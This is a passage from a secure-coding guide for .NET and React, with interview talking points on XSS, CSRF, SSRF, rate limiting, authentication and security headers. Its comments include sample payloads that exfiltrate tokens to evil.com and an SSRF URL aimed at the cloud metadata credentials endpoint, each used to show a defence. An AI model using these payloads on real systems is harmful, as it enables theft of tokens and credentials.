public async Task<List<Order>> GetOrdersByStatus(string status)
{
    var queryDefinition = new QueryDefinition(
        "SELECT * FROM c WHERE c.status = @status")
        .WithParameter("@status", status);

    var iterator = _container.GetItemQueryIterator<Order>(queryDefinition);
    var results = new List<Order>();

    while (iterator.HasMoreResults)
    {
        var response = await iterator.ReadNextAsync();
        results.AddRange(response);
    }

    return results;
}

// Input validation
public class OrderRequest
{
    [Required]
    [StringLength(100, MinimumLength = 1)]
    [RegularExpression(@"^[a-zA-Z0-9\s-]+$")]
    public string OrderId { get; set; }

    [Required]
    [Range(0.01, 1000000)]
    public decimal Amount { get; set; }

    [Required]
    [EmailAddress]
    public string CustomerEmail { get; set; }
}
```

**React/SPA XSS Prevention:**

XSS (Cross-Site Scripting) is the most critical vulnerability for SPAs since tokens and user data are accessible to JavaScript.

```typescript
// ❌ DANGEROUS: Never use dangerouslySetInnerHTML with user input
function UserComment({ comment }: { comment: string }) {
    return <div dangerouslySetInnerHTML={{ __html: comment }} />;
    // If comment = "<img src=x onerror='fetch(\"evil.com?token=\"+localStorage.token)'>"
    // Attacker steals the access token
}

// ✅ GOOD: React automatically escapes content
function UserComment({ comment }: { comment: string }) {
    return <div>{comment}</div>;
    // React converts < > to &lt; &gt; automatically
}

// ✅ GOOD: Sanitize HTML if you must render it
import DOMPurify from 'dompurify';

function RichTextComment({ htmlContent }: { htmlContent: string }) {
    const sanitized = DOMPurify.sanitize(htmlContent, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
        ALLOWED_ATTR: ['href'],
    });

    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}

// ❌ DANGEROUS: Constructing href from user input
function Link({ url }: { url: string }) {
    return <a href={url}>Click me</a>;
    // If url = "javascript:fetch('evil.com?token='+localStorage.token)"
    // Attacker executes arbitrary JS
}

// ✅ GOOD: Validate URL scheme
function SafeLink({ url }: { url: string }) {
    const isValidUrl = (input: string): boolean => {
        try {
            const parsed = new URL(input);
            return ['http:', 'https:'].includes(parsed.protocol);
        } catch {
            return false;
        }
    };

    if (!isValidUrl(url)) {
        return <span>Invalid link</span>;
    }

    return <a href={url} rel="noopener noreferrer" target="_blank">Click me</a>;
}

// ❌ DANGEROUS: Eval and Function constructor
const userCode = "malicious code";
eval(userCode);  // Never use eval with user input
new Function(userCode)();  // Never use Function constructor

// ✅ GOOD: Use safe alternatives
// Instead of eval, use JSON.parse for JSON data
const data = JSON.parse(jsonString);

// Instead of Function, use proper callbacks or configuration objects
const config = { onClick: () => console.log('Safe callback') };

// XSS Prevention Checklist for React:
// 1. Never use dangerouslySetInnerHTML without DOMPurify
// 2. Validate all URLs before using in href, src, or action attributes
// 3. Never use eval() or new Function() with user input
// 4. Sanitize user input on backend before storing in database
// 5. Use Content Security Policy (CSP) headers to block inline scripts
// 6. Avoid storing sensitive data in localStorage (use memory or sessionStorage)
```

**React CSRF Protection:**

CSRFs are less of a concern for SPAs using Bearer tokens (not cookies), but still important if you use cookies for auth.

```typescript
// Backend: Generate CSRF token for session
[HttpPost("api/csrf-token")]
public IActionResult GetCsrfToken()
{
    var tokens = _antiforgery.GetAndStoreTokens(HttpContext);
    return Ok(new { csrfToken = tokens.RequestToken });
}

[HttpPost("api/orders")]
[ValidateAntiForgeryToken]
public async Task<IActionResult> CreateOrder([FromBody] OrderRequest request)
{
    // Protected against CSRF
}

// React: Include CSRF token in requests
function App() {
    const [csrfToken, setCsrfToken] = useState<string>('');

    useEffect(() => {
        // Fetch CSRF token on app load
        fetch('/api/csrf-token', { credentials: 'include' })
            .then(res => res.json())
            .then(data => setCsrfToken(data.csrfToken));
    }, []);

    const createOrder = async (order: Order) => {
        await fetch('/api/orders', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-Token': csrfToken,  // Include CSRF token
            },
            credentials: 'include',  // Send cookies
            body: JSON.stringify(order),
        });
    };

    return <OrderForm onSubmit={createOrder} />;
}

// Alternative: Use SameSite cookies (no CSRF token needed)
// Backend sets:
// Set-Cookie: auth=xyz; HttpOnly; Secure; SameSite=Strict
// This prevents CSRF attacks automatically (cookies not sent on cross-site requests)
```

**Interview Talking Points:**
- "React automatically escapes JSX content, but dangerouslySetInnerHTML bypasses this protection"
- "We use DOMPurify to sanitize any HTML from user input or third-party APIs"
- "For SPAs using Bearer tokens, CSRF is less of a concern than XSS"
- "We validate all URLs before using in href attributes to prevent javascript: protocol attacks"
- "CSP headers are our last line of defense - they block inline scripts even if XSS occurs"

### 4. Insecure Design

**Example: Lack of Rate Limiting**
```csharp
// Add rate limiting middleware
public void ConfigureServices(IServiceCollection services)
{
    services.AddRateLimiter(options =>
    {
        // Global rate limit
        options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(context =>
        {
            return RateLimitPartition.GetFixedWindowLimiter(
                partitionKey: context.User.Identity?.Name ?? context.Request.Headers.Host.ToString(),
                factory: partition => new FixedWindowRateLimiterOptions
                {
                    AutoReplenishment = true,
                    PermitLimit = 100,
                    QueueLimit = 0,
                    Window = TimeSpan.FromMinutes(1)
                });
        });

        // Endpoint-specific rate limits
        options.AddPolicy("LoginRateLimit", context =>
            RateLimitPartition.GetSlidingWindowLimiter(
                partitionKey: context.Connection.RemoteIpAddress?.ToString() ?? "unknown",
                factory: partition => new SlidingWindowRateLimiterOptions
                {
                    AutoReplenishment = true,
                    PermitLimit = 5,
                    QueueLimit = 0,
                    Window = TimeSpan.FromMinutes(15),
                    SegmentsPerWindow = 3
                }));

        options.OnRejected = async (context, token) =>
        {
            context.HttpContext.Response.StatusCode = 429;
            await context.HttpContext.Response.WriteAsJsonAsync(new
            {
                error = "Too many requests",
                retryAfter = context.Lease.TryGetMetadata(MetadataName.RetryAfter, out var retryAfter)
                    ? retryAfter.TotalSeconds
                    : null
            }, token);
        };
    });
}

// Usage
[HttpPost("login")]
[EnableRateLimiting("LoginRateLimit")]
public async Task<IActionResult> Login(LoginRequest request)
{
    // Login logic
}
```

### 5. Security Misconfiguration

**Mitigation:**
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddControllers(options =>
    {
        // Require HTTPS
        options.Filters.Add(new RequireHttpsAttribute());
    });

    // Security headers
    services.AddHsts(options =>
    {
        options.Preload = true;
        options.IncludeSubDomains = true;
        options.MaxAge = TimeSpan.FromDays(365);
    });

    // Disable detailed errors in production
    if (_env.IsProduction())
    {
        services.AddProblemDetails(options =>
        {
            options.IncludeExceptionDetails = (ctx, ex) => false;
        });
    }
}

public void Configure(IApplicationBuilder app)
{
    // Security headers middleware
    app.Use(async (context, next) =>
    {
        context.Response.Headers.Add("X-Content-Type-Options", "nosniff");
        context.Response.Headers.Add("X-Frame-Options", "DENY");
        context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");
        context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");
        context.Response.Headers.Add("Permissions-Policy", "geolocation=(), microphone=(), camera=()");

        // Remove server header
        context.Response.Headers.Remove("Server");

        await next();
    });

    app.UseHsts();
    app.UseHttpsRedirection();
}
```

### 6. Vulnerable and Outdated Components

**Mitigation:**
```xml
<!-- Enable NuGet security audits -->
<Project>
  <PropertyGroup>
    <NuGetAudit>true</NuGetAudit>
    <NuGetAuditLevel>low</NuGetAuditLevel>
    <NuGetAuditMode>all</NuGetAuditMode>
  </PropertyGroup>
</Project>
```

```bash
# Regular dependency scanning
dotnet list package --vulnerable --include-transitive

# Automated updates with Dependabot (GitHub)
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "nuget"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
```

### 7. Identification and Authentication Failures

**Mitigation:**
```csharp
public class AccountController : Controller
{
    private readonly UserManager<ApplicationUser> _userManager;
    private readonly SignInManager<ApplicationUser> _signInManager;
    private readonly IDistributedCache _cache;

    [HttpPost("login")]
    public async Task<IActionResult> Login(LoginRequest request)
    {
        // Rate limiting per username
        var lockoutKey = $"lockout:{request.Username}";
        var attempts = await _cache.GetStringAsync(lockoutKey);
        var attemptCount = string.IsNullOrEmpty(attempts) ? 0 : int.Parse(attempts);

        if (attemptCount >= 5)
        {
            return Unauthorized(new { error = "Account temporarily locked. Try again in 15 minutes." });
        }

        // Find user
        var user = await _userManager.FindByNameAsync(request.Username);

        if (user == null)
        {
            // Don't reveal that user doesn't exist
            await Task.Delay(Random.Shared.Next(100, 300));  // Timing attack mitigation
            return Unauthorized(new { error = "Invalid credentials" });
        }

        // Check password
        var result = await _signInManager.PasswordSignInAsync(
            user,
            request.Password,
            isPersistent: false,
            lockoutOnFailure: true);

        if (!result.Succeeded)
        {
            // Increment failed attempts
            await _cache.SetStringAsync(
                lockoutKey,
                (attemptCount + 1).ToString(),
                new DistributedCacheEntryOptions
                {
                    AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(15)
                });

            if (result.IsLockedOut)
            {
                return Unauthorized(new { error = "Account locked" });
            }

            if (result.RequiresTwoFactor)
            {
                return Ok(new { requiresMfa = true });
            }

            return Unauthorized(new { error = "Invalid credentials" });
        }

        // Clear failed attempts
        await _cache.RemoveAsync(lockoutKey);

        // Generate session token
        var token = GenerateJwtToken(user);
        return Ok(new { token });
    }

    [HttpPost("register")]
    public async Task<IActionResult> Register(RegisterRequest request)
    {
        // Password strength validation
        var passwordValidator = new PasswordValidator<ApplicationUser>();
        var validationResult = await passwordValidator.ValidateAsync(
            _userManager,
            null,
            request.Password);

        if (!validationResult.Succeeded)
        {
            return BadRequest(validationResult.Errors);
        }

        // Check for common passwords
        if (IsCommonPassword(request.Password))
        {
            return BadRequest(new { error = "Password is too common" });
        }

        var user = new ApplicationUser
        {
            UserName = request.Email,
            Email = request.Email,
            EmailConfirmed = false
        };

        var result = await _userManager.CreateAsync(user, request.Password);

        if (result.Succeeded)
        {
            // Send email verification
            var token = await _userManager.GenerateEmailConfirmationTokenAsync(user);
            await SendVerificationEmailAsync(user.Email, token);

            return Ok(new { message = "Registration successful. Please verify your email." });
        }

        return BadRequest(result.Errors);
    }

    private bool IsCommonPassword(string password)
    {
        // Check against list of 10,000 most common passwords
        var commonPasswords = LoadCommonPasswords();
        return commonPasswords.Contains(password.ToLower());
    }
}

// Identity configuration
public void ConfigureServices(IServiceCollection services)
{
    services.AddIdentity<ApplicationUser, IdentityRole>(options =>
    {
        // Password settings
        options.Password.RequireDigit = true;
        options.Password.RequireLowercase = true;
        options.Password.RequireUppercase = true;
        options.Password.RequireNonAlphanumeric = true;
        options.Password.RequiredLength = 12;
        options.Password.RequiredUniqueChars = 4;

        // Lockout settings
        options.Lockout.DefaultLockoutTimeSpan = TimeSpan.FromMinutes(15);
        options.Lockout.MaxFailedAccessAttempts = 5;
        options.Lockout.AllowedForNewUsers = true;

        // User settings
        options.User.RequireUniqueEmail = true;
        options.SignIn.RequireConfirmedEmail = true;
        options.SignIn.RequireConfirmedAccount = true;
    })
    .AddEntityFrameworkStores<ApplicationDbContext>()
    .AddDefaultTokenProviders();

    // Multi-factor authentication
    services.AddAuthentication()
        .AddMicrosoftAccount(options =>
        {
            options.ClientId = Configuration["Authentication:Microsoft:ClientId"];
            options.ClientSecret = Configuration["Authentication:Microsoft:ClientSecret"];
        });
}
```

### 8. Software and Data Integrity Failures

**Mitigation:**
```csharp
// Verify package signatures
<Project>
  <PropertyGroup>
    <SignAssembly>true</SignAssembly>
    <AssemblyOriginatorKeyFile>key.snk</AssemblyOriginatorKeyFile>
  </PropertyGroup>
</Project>

// Content Security Policy for CDN resources
<script src="https://cdn.example.com/library.js"
        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
        crossorigin="anonymous"></script>

// Verify file uploads
public class FileUploadService
{
    private readonly string[] _allowedExtensions = { ".jpg", ".jpeg", ".png", ".pdf" };
    private readonly long _maxFileSize = 10 * 1024 * 1024;  // 10 MB

    public async Task<string> UploadFileAsync(IFormFile file)
    {
        // Validate file extension
        var extension = Path.GetExtension(file.FileName).ToLowerInvariant();
        if (!_allowedExtensions.Contains(extension))
        {
            throw new InvalidOperationException("File type not allowed");
        }

        // Validate file size
        if (file.Length > _maxFileSize)
        {
            throw new InvalidOperationException("File too large");
        }

        // Validate content type matches extension
        var expectedContentType = GetContentType(extension);
        if (file.ContentType != expectedContentType)
        {
            throw new InvalidOperationException("Content type mismatch");
        }

        // Scan file content (check magic bytes)
        using var stream = file.OpenReadStream();
        if (!IsValidFileContent(stream, extension))
        {
            throw new InvalidOperationException("Invalid file content");
        }

        // Generate safe filename
        var safeFileName = $"{Guid.NewGuid()}{extension}";

        // Upload to blob storage
        var blobClient = _blobServiceClient
            .GetBlobContainerClient("uploads")
            .GetBlobClient(safeFileName);

        stream.Position = 0;
        await blobClient.UploadAsync(stream, overwrite: false);

        return blobClient.Uri.ToString();
    }

    private bool IsValidFileContent(Stream stream, string extension)
    {
        var buffer = new byte[8];
        stream.Read(buffer, 0, 8);
        stream.Position = 0;

        return extension switch
        {
            ".jpg" or ".jpeg" => buffer[0] == 0xFF && buffer[1] == 0xD8,
            ".png" => buffer[0] == 0x89 && buffer[1] == 0x50,
            ".pdf" => buffer[0] == 0x25 && buffer[1] == 0x50,
            _ => false
        };
    }
}
```

### 9. Security Logging and Monitoring Failures

**Mitigation:**
```csharp
public class SecurityEventLogger
{
    private readonly TelemetryClient _telemetry;
    private readonly ILogger<SecurityEventLogger> _logger;

    public void LogAuthenticationSuccess(string userId, string ipAddress)
    {
        _logger.LogInformation(
            "Authentication successful for user {UserId} from {IPAddress}",
            userId, ipAddress);

        _telemetry.TrackEvent("AuthenticationSuccess", new Dictionary<string, string>
        {
            ["UserId"] = userId,
            ["IPAddress"] = ipAddress,
            ["Timestamp"] = DateTime.UtcNow.ToString("o")
        });
    }

    public void LogAuthenticationFailure(string username, string ipAddress, string reason)
    {
        _logger.LogWarning(
            "Authentication failed for username {Username} from {IPAddress}. Reason: {Reason}",
            username, ipAddress, reason);

        _telemetry.TrackEvent("AuthenticationFailure", new Dictionary<string, string>
        {
            ["Username"] = username,
            ["IPAddress"] = ipAddress,
            ["Reason"] = reason,
            ["Timestamp"] = DateTime.UtcNow.ToString("o")
        });

        // Alert on suspicious activity
        if (IsSuspiciousActivity(username, ipAddress))
        {
            SendSecurityAlert(username, ipAddress, reason);
        }
    }

    public void LogAuthorizationFailure(string userId, string resource, string action)
    {
        _logger.LogWarning(
            "Authorization failed: User {UserId} attempted {Action} on {Resource}",
            userId, action, resource);

        _telemetry.TrackEvent("AuthorizationFailure", new Dictionary<string, string>
        {
            ["UserId"] = userId,
            ["Resource"] = resource,
            ["Action"] = action
        });
    }

    public void LogSensitiveDataAccess(string userId, string dataType)
    {
        _logger.LogInformation(
            "Sensitive data access: User {UserId} accessed {DataType}",
            userId, dataType);

        _telemetry.TrackEvent("SensitiveDataAccess", new Dictionary<string, string>
        {
            ["UserId"] = userId,
            ["DataType"] = dataType,
            ["Timestamp"] = DateTime.UtcNow.ToString("o")
        });
    }

    private bool IsSuspiciousActivity(string username, string ipAddress)
    {
        // Check for:
        // - Multiple failed attempts from same IP
        // - Attempts from unusual geo-location
        // - Credential stuffing patterns
        return false;
    }
}

// Application Insights alerts
{
  "name": "Multiple Failed Logins",
  "criteria": {
    "odata.type": "Microsoft.Azure.Monitor.SingleResourceMultipleMetricCriteria",
    "allOf": [
      {
        "name": "FailedLogins",
        "metricName": "AuthenticationFailure",
        "operator": "GreaterThan",
        "threshold": 10,
        "timeAggregation": "Total",
        "dimensions": [
          {
            "name": "IPAddress",
            "operator": "Include",
            "values": ["*"]
          }
        ]
      }
    ]
  },
  "windowSize": "PT5M",
  "evaluationFrequency": "PT1M"
}
```

### 10. Server-Side Request Forgery (SSRF)

**Vulnerability:**
```csharp
// BAD: User-controlled URL
[HttpGet("fetch")]
public async Task<IActionResult> FetchUrl(string url)
{
    var client = new HttpClient();
    var response = await client.GetStringAsync(url);
    // Attacker can: url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    return Ok(response);
}
```

**Mitigation:**
```csharp
public class SsrfProtectionService
{
    private readonly HttpClient _httpClient;
    private readonly ILogger<SsrfProtectionService> _logger;
    private readonly string[] _allowedHosts = { "api.example.com", "data.example.com" };
    private readonly string[] _blockedIpRanges =
    {
        "127.0.0.0/8",      // Loopback
        "10.0.0.0/8",       // Private
        "172.16.0.0/12",    // Private
        "192.168.0.0/16",   // Private
        "169.254.0.0/16",   // Link-local (AWS metadata)
        "::1/128",          // IPv6 loopback
        "fc00::/7"          // IPv6 private
    };

    public async Task<string> FetchUrlAsync(string url)
    {
        // Validate URL format
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri))
        {
            throw new ArgumentException("Invalid URL");
        }

        // Only allow HTTP/HTTPS
        if (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps)
        {
            throw new ArgumentException("Only HTTP/HTTPS allowed");
        }

        // Whitelist allowed hosts
        if (!_allowedHosts.Contains(uri.Host))
        {
            throw new ArgumentException($"Host not allowed: {uri.Host}");
        }

        // Resolve and validate IP
        var ipAddresses = await Dns.GetHostAddressesAsync(uri.Host);
        foreach (var ip in ipAddresses)
        {
            if (IsBlockedIp(ip))
            {
                _logger.LogWarning("Blocked SSRF attempt to {IP} for host {Host}", ip, uri.Host);
                throw new ArgumentException("IP address blocked");
            }
        }

        // Make request with timeout
        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
        var response = await _httpClient.GetStringAsync(uri, cts.Token);

        return response;
    }

    private bool IsBlockedIp(IPAddress ip)
    {
        foreach (var range in _blockedIpRanges)
        {
            if (IsInRange(ip, range))
            {
                return true;
            }
        }
        return false;
    }

    private bool IsInRange(IPAddress ip, string cidr)
    {
        var parts = cidr.Split('/');
        var networkAddress = IPAddress.Parse(parts[0]);
        var prefixLength = int.Parse(parts[1]);

        var ipBytes = ip.GetAddressBytes();
        var networkBytes = networkAddress.GetAddressBytes();

        if (ipBytes.Length != networkBytes.Length)
        {
            return false;
        }

        var bytesToCheck = prefixLength / 8;
        var bitsToCheck = prefixLength % 8;

        for (int i = 0; i < bytesToCheck; i++)
        {
            if (ipBytes[i] != networkBytes[i])
            {
                return false;
            }
        }

        if (bitsToCheck > 0)
        {
            var mask = (byte)(0xFF << (8 - bitsToCheck));
            if ((ipBytes[bytesToCheck] & mask) != (networkBytes[bytesToCheck] & mask))
            {
                return false;
            }
        }

        return true;
    }
}
```

---

## 5. Secure Headers (CORS, CSP, HSTS, etc.)

### Comprehensive Security Headers

```csharp
public class SecurityHeadersMiddleware
{
    private readonly RequestDelegate _next;
    private readonly IConfiguration _configuration;

    public async Task InvokeAsync(HttpContext context)
    {
        // HTTP Strict Transport Security (HSTS)
        // Forces HTTPS for 1 year, includes subdomains
        if (!context.Request.IsHttps && _configuration.GetValue<bool>("UseHsts"))
        {
            context.Response.Redirect($"https://{context.Request.Host}{context.Request.Path}{context.Request.QueryString}");
            return;
        }

        context.Response.Headers.Add("Strict-Transport-Security",
            "max-age=31536000; includeSubDomains; preload");

        // Content Security Policy (CSP)
        // Prevents XSS by whitelisting content sources
        var csp = new StringBuilder();
        csp.Append("default-src 'self'; ");
        csp.Append("script-src 'self' https://cdn.example.com; ");
        csp.Append("style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; ");
        csp.Append("img-src 'self' data: https:; ");
        csp.Append("font-src 'self' https://fonts.gstatic.com; ");
        csp.Append("connect-src 'self' https://api.example.com; ");
        csp.Append("frame-ancestors 'none'; ");
        csp.Append("base-uri 'self'; ");
        csp.Append("form-action 'self'; ");
        csp.Append("upgrade-insecure-requests;");

        context.Response.Headers.Add("Content-Security-Policy", csp.ToString());

        // Report CSP violations
        context.Response.Headers.Add("Content-Security-Policy-Report-Only",
            csp.ToString() + " report-uri /api/csp-report;");

        // X-Content-Type-Options
        // Prevents MIME type sniffing
        context.Response.Headers.Add("X-Content-Type-Options", "nosniff");

        // X-Frame-Options
        // Prevents clickjacking
        context.Response.Headers.Add("X-Frame-Options", "DENY");

        // X-XSS-Protection
        // Legacy XSS protection (mostly replaced by CSP)
        context.Response.Headers.Add("X-XSS-Protection", "1; mode=block");

        // Referrer-Policy
        // Controls referrer information
        context.Response.Headers.Add("Referrer-Policy", "strict-origin-when-cross-origin");

        // Permissions-Policy (formerly Feature-Policy)
        // Controls browser features
        var permissionsPolicy = new StringBuilder();
        permissionsPolicy.Append("geolocation=(), ");
        permissionsPolicy.Append("microphone=(), ");
        permissionsPolicy.Append("camera=(), ");
        permissionsPolicy.Append("payment=(), ");
        permissionsPolicy.Append("usb=(), ");
        permissionsPolicy.Append("magnetometer=(), ");
        permissionsPolicy.Append("gyroscope=(), ");
        permissionsPolicy.Append("accelerometer=()");

        context.Response.Headers.Add("Permissions-Policy", permissionsPolicy.ToString());

        // Remove sensitive headers
        context.Response.Headers.Remove("Server");
        context.Response.Headers.Remove("X-Powered-By");
        context.Response.Headers.Remove("X-AspNet-Version");
        context.Response.Headers.Remove("X-AspNetMvc-Version");

        await _next(context);
    }
}
```

### CORS Configuration

```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        // Restrictive CORS policy
        options.AddPolicy("ProductionPolicy", builder =>
        {
            builder
                .WithOrigins(
                    "https://www.example.com",
                    "https://app.example.com")
                .WithMethods("GET", "POST", "PUT", "DELETE")
                .WithHeaders("Authorization", "Content-Type", "X-Requested-With")
                .WithExposedHeaders("X-Pagination", "X-RateLimit-Remaining")
                .SetIsOriginAllowedToAllowWildcardSubdomains()
                .AllowCredentials()
                .SetPreflightMaxAge(TimeSpan.FromMinutes(10));
        });

        // Development policy (less restrictive)
        options.AddPolicy("DevelopmentPolicy", builder =>
        {
            builder
                .AllowAnyOrigin()
                .AllowAnyMethod()
                .AllowAnyHeader();
        });
    });
}

public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    if (env.IsDevelopment())
    {
        app.UseCors("DevelopmentPolicy");
    }
    else
    {
        app.UseCors("ProductionPolicy");
    }
}

// Per-endpoint CORS
[EnableCors("ProductionPolicy")]
[HttpGet("public-data")]
public IActionResult GetPublicData()
{
    return Ok(data);
}

[DisableCors]
[HttpPost("internal-only")]
public IActionResult InternalOperation()
{
    return Ok();
}
```

### CSP Violation Reporting

```csharp
[AllowAnonymous]
[HttpPost("api/csp-report")]
public async Task<IActionResult> CspReport()
{
    using var reader = new StreamReader(Request.Body);
    var body = await reader.ReadToEndAsync();

    var report = JsonSerializer.Deserialize<CspViolationReport>(body);

    _logger.LogWarning(
        "CSP Violation: {DocumentUri} blocked {BlockedUri} for directive {ViolatedDirective}",
        report.CspReport.DocumentUri,
        report.CspReport.BlockedUri,
        report.CspReport.ViolatedDirective);

    _telemetry.TrackEvent("CspViolation", new Dictionary<string, string>
    {
        ["DocumentUri"] = report.CspReport.DocumentUri,
        ["BlockedUri"] = report.CspReport.BlockedUri,
        ["ViolatedDirective"] = report.CspReport.ViolatedDirective,
        ["SourceFile"] = report.CspReport.SourceFile,
        ["LineNumber"] = report.CspReport.LineNumber.ToString()
    });

    return Ok();
}

public class CspViolationReport
{
    [JsonPropertyName("csp-report")]
    public CspReport CspReport { get; set; }
}

public class CspReport
{
    [JsonPropertyName("document-uri")]
    public string DocumentUri { get; set; }

    [JsonPropertyName("blocked-uri")]
    public string BlockedUri { get; set; }

    [JsonPropertyName("violated-directive")]
    public string ViolatedDirective { get; set; }

    [JsonPropertyName("source-file")]
    public string SourceFile { get; set; }

    [JsonPropertyName("line-number")]
    public int LineNumber { get; set; }
}
```

### React/SPA CSP Configuration

**Challenge:** React apps often use inline scripts and styles during development, which CSP blocks by default.

**Solutions:**

```typescript
// Option 1: Nonce-based CSP (Recommended for React)
// Backend generates unique nonce per request
public class CspNonceMiddleware
{
    private readonly RequestDelegate _next;

    public async Task InvokeAsync(HttpContext context)
    {
        var nonce = Convert.ToBase64String(RandomNumberGenerator.GetBytes(32));
        context.Items["csp-nonce"] = nonce;

        var csp = $@"
            default-src 'self';
            script-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net;
            style-src 'self' 'nonce-{nonce}' https://fonts.googleapis.com;
            img-src 'self' data: https:;
            font-src 'self' https://fonts.gstatic.com;
            connect-src 'self' https://api.example.com https://login.microsoftonline.com;
            frame-ancestors 'none';
            base-uri 'self';
            form-action 'self';
        ".Replace("\n", " ").Replace("  ", " ");

        context.Response.Headers.Add("Content-Security-Policy", csp);
        await _next(context);
    }
}

// Razor page injects nonce into React root
<!DOCTYPE html>
<html>
<head>
    <meta name="csp-nonce" content="@Context.Items["csp-nonce"]" />
</head>
<body>
    <div id="root"></div>
    <script nonce="@Context.Items["csp-nonce"]" src="/static/js/main.js"></script>
</body>
</html>

// React reads nonce from meta tag for dynamic scripts
const getNonce = (): string | null => {
    return document.querySelector('meta[name="csp-nonce"]')?.getAttribute('content');
};

// Use nonce when adding dynamic scripts
const loadScript = (src: string) => {
    const script = document.createElement('script');
    script.src = src;
    const nonce = getNonce();
    if (nonce) {
        script.setAttribute('nonce', nonce);
    }
    document.head.appendChild(script);
};

// Option 2: Hash-based CSP (For Azure Static Web Apps)
// staticwebapp.config.json
{
  "globalHeaders": {
    "content-security-policy": "default-src 'self'; script-src 'self' 'sha256-hash-of-inline-script'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.example.com https://login.microsoftonline.com; frame-ancestors 'none';"
  }
}

// Generate hash for inline script (run this locally)
// echo -n "your inline script content" | openssl dgst -sha256 -binary | openssl base64

// Option 3: Strict CSP with React (Production Build)
// Vite/CRA production builds don't use inline scripts, so strict CSP works:
{
  "globalHeaders": {
    "content-security-policy": "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; font-src 'self' https://fonts.gstatic.com; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests;"
  }
}

// React component for CSP violation handling
import { useEffect } from 'react';

export function CspViolationReporter() {
    useEffect(() => {
        const handleCspViolation = (event: SecurityPolicyViolationEvent) => {
            console.error('CSP Violation:', {
                blockedURI: event.blockedURI,
                violatedDirective: event.violatedDirective,
                originalPolicy: event.originalPolicy,
            });

            // Report to backend
            fetch('/api/csp-report', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    'csp-report': {
                        'document-uri': window.location.href,
                        'blocked-uri': event.blockedURI,
                        'violated-directive': event.violatedDirective,
                        'source-file': event.sourceFile,
                        'line-number': event.lineNumber,
                    },
                }),
            });
        };

        document.addEventListener('securitypolicyviolation', handleCspViolation);
        return () => document.removeEventListener('securitypolicyviolation', handleCspViolation);
    }, []);

    return null;
}

// Add to App.tsx
function App() {
    return (
        <>
            <CspViolationReporter />
            {/* Rest of app */}
        </>
    );
}
```

**CSP Decision Matrix for React:**

| Environment | CSP Strategy | Trade-offs |
|-------------|--------------|------------|
| **Development** | `'unsafe-inline'` or `'unsafe-eval'` | Fast dev experience, but insecure |
| **Staging** | Nonce-based CSP | Tests production CSP without breaking HMR |
| **Production (with backend)** | Nonce-based CSP | Most secure, requires server-side rendering |
| **Production (Static Web Apps)** | Hash-based or no inline scripts | Secure, but requires build-time hash generation |
| **Production (CDN-only)** | Strict CSP (no inline) | Most secure, requires no inline scripts/styles |

**CORS for React Development:**

```csharp
// Backend API allows React dev server (localhost:5173 for Vite)
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("ReactDevPolicy", builder =>
        {
            builder
                .WithOrigins("http://localhost:5173", "http://localhost:3000")  // Vite, CRA
                .AllowAnyMethod()
                .AllowAnyHeader()
                .AllowCredentials()  // Required for auth cookies
                .SetIsOriginAllowedToAllowWildcardSubdomains();
        });

        options.AddPolicy("ProductionPolicy", builder =>
        {
            builder
                .WithOrigins("https://app.example.com", "https://www.example.com")
                .WithMethods("GET", "POST", "PUT", "DELETE")
                .WithHeaders("Authorization", "Content-Type", "X-CSRF-Token")
                .WithExposedHeaders("X-Pagination", "X-RateLimit-Remaining")
                .AllowCredentials()
                .SetPreflightMaxAge(TimeSpan.FromHours(1));
        });
    });
}

public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    app.UseCors(env.IsDevelopment() ? "ReactDevPolicy" : "ProductionPolicy");
}
```

**React Development Proxy (Alternative to CORS):**

```typescript
// vite.config.ts - Proxy API calls to avoid CORS in dev
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
    plugins: [react()],
    server: {
        proxy: {
            '/api': {
                target: 'https://localhost:7001',
                changeOrigin: true,
                secure: false,  // For self-signed certs in dev
            },
        },
    },
});

// Now React can call /api/orders and it's proxied to https://localhost:7001/api/orders
// No CORS needed in development!
```

**Interview Talking Points:**
- "CSP is critical for React apps because XSS can steal tokens from sessionStorage"
- "We use nonce-based CSP in production with server-side rendering for maximum security"
- "In dev, we proxy API calls through Vite to avoid CORS complexity"
- "Production CSP blocks inline scripts, so we ensure our build process outputs external JS files"
- "We monitor CSP violations in Application Insights to detect potential XSS attempts"

---

## 6. Rate Limiting for Security

### Multi-Level Rate Limiting

```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddRateLimiter(options =>
    {
        // 1. Global rate limit
        options.GlobalLimiter = PartitionedRateLimiter.Create<HttpContext, string>(context =>
        {
            var userId = context.User.FindFirstValue(ClaimTypes.NameIdentifier);
            var key = userId ?? context.Connection.RemoteIpAddress?.ToString() ?? "anonymous";

            return RateLimitPartition.GetTokenBucketLimiter(key, _ => new TokenBucketRateLimiterOptions
            {
                TokenLimit = 1000,
                ReplenishmentPeriod = TimeSpan.FromHours(1),
